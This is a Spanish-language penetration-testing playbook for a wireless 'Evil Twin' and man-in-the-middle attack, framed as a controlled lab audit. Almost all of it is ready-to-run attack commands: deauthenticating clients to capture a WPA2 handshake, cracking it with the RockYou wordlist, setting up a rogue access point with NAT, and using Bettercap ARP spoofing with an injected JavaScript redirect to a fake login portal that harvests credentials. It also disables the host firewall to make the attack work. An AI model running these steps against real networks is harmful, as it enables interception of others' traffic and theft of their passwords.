# Playbook: Auditoría Wireless (Evil Twin) & Ataque MITM

## 📋 Resumen Ejecutivo
Este documento detalla la metodología técnica para realizar una auditoría de seguridad completa en redes inalámbricas. El procedimiento abarca desde la preparación del hardware y captura de handshakes WPA2, hasta el despliegue de un punto de acceso falso (Rogue AP) y la ejecución de ataques Man-in-the-Middle (MITM) para la captura de credenciales en un entorno controlado.

---

## 🛠️ Fase 1: Preparación del Hardware y Drivers
**Hardware:** Adaptador WiFi USB Alfa/TP-Link (Chipset Realtek).
**Objetivo:** Habilitar el modo monitor e inyección de paquetes.

### 1.1 Verificación y Drivers (Chipset RTL8188EUS)
Muchos adaptadores modernos requieren drivers específicos para permitir la inyección de paquetes.

```bash
# Verificar detección del USB
lsusb

# Instalación de dependencias y headers del kernel
sudo apt install bc dkms build-essential libelf-dev

# Compilación e instalación del driver realtek
git clone [https://github.com/aircrack-ng/rtl8188eus](https://github.com/aircrack-ng/rtl8188eus)
cd rtl8188eus
sudo make dkms_install

# Reinicio necesario para aplicar cambios en el kernel
sudo reboot
1.2 Activación de Modo Monitor
Bash

# Matar procesos conflictivos (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Iniciar interfaz en modo monitor
sudo airmon-ng start wlan0
📡 Fase 2: Reconocimiento y Captura (Handshake)
Objetivo: Capturar el "apretón de manos" (4-way handshake) WPA para su posterior crackeo.

2.1 Escaneo y Captura
Bash

# Escaneo de redes y captura de tráfico en el canal específico (Ej: 11)
sudo airodump-ng --bssid E8:43:68:29:9D:44 -c 11 -w captura_lab wlan0
2.2 Ataque de Desautenticación (Forzar el Handshake)
Desconectamos a los clientes legítimos para forzar su reconexión y capturar las credenciales cifradas.

Bash

# Enviar 20 paquetes de deauth al AP objetivo
sudo aireplay-ng --deauth 20 -a E8:43:68:29:9D:44 wlan0
Indicador de éxito: [WPA handshake: E8:43:68:29:9D:44] en la esquina superior derecha.

2.3 Cracking de Contraseña (Fuerza Bruta)
Bash

# Preparar diccionario (RockYou)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Ejecutar ataque de diccionario contra la captura
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b E8:43:68:29:9D:44 captura_lab-01.cap
😈 Fase 3: Despliegue de Evil Twin (Rogue AP)
Objetivo: Crear un punto de acceso falso para atraer víctimas y redirigir su tráfico.

3.1 Configuración de Enrutamiento (IPTables)
Para que la víctima tenga internet a través de nosotros (y no sospeche), debemos configurar el equipo atacante como un router (NAT).

Bash

# Habilitar IP Forwarding en el kernel
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

# Limpieza de reglas previas
sudo iptables -F
sudo iptables -t nat -F

# Configuración de NAT (Enmascaramiento)
# eth0 = Interfaz con internet real | wlan0 = Interfaz del AP Falso
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
🕷️ Fase 4: Ataque MITM y Phishing (Bettercap)
Objetivo: Interceptar el tráfico HTTP y redirigir al usuario a un portal cautivo falso para obtener credenciales en texto plano.

4.1 Preparación del Entorno Web
Creación de un servidor web en Python capaz de capturar peticiones POST.

Payload de Redirección (inyectar.js):

JavaScript

window.location.href = '[http://10.0.2.6/login.html](http://10.0.2.6/login.html)';
Servidor Inteligente (server.py): Script en Python para levantar un puerto 80 y mostrar credenciales capturadas en consola.

4.2 Ejecución con Bettercap
Comandos ejecutados dentro de la consola de bettercap para realizar ARP Spoofing e inyección de código.

Bash

# 1. Reconocimiento de red
net.probe on
net.show

# 2. Definición de objetivos (IP de la víctima)
set arp.spoof.targets 10.0.2.15

# 3. Configuración de inyección JS
set http.proxy.injectjs /home/kali/inyectar.js
set http.proxy.ignore 10.0.2.6      # Evitar autoinyección (Loop)
set http.proxy.inject.getonly true  # Prevenir errores de reenvío POST

# 4. Iniciar ataque
http.proxy on
arp.spoof on
🔧 Resolución de Problemas (Troubleshooting Log)
Durante el despliegue en laboratorio, se identificaron y solucionaron los siguientes bloqueos críticos:

Conflicto Puerto 80: Kali Linux inicia apache2 por defecto.

Solución: sudo systemctl stop apache2 && sudo systemctl disable apache2.

Fallo de Tráfico en la Víctima (Connection Refused): A pesar de activar ip_forward, la víctima no navegaba.

Diagnóstico: Se detectó que UFW (Uncomplicated Firewall) estaba bloqueando el tráfico de reenvío.

Solución: sudo ufw disable.

Bettercap Bugs: La versión de repositorio de Kali presentaba fallos en http.proxy.

Solución: Instalación manual de la última versión desde GitHub (v2.33.0+).

Bucle Infinito de Redirección: El script JS se inyectaba en la propia página de phishing.

Solución: Configurar set http.proxy.ignore [IP_ATACANTE].

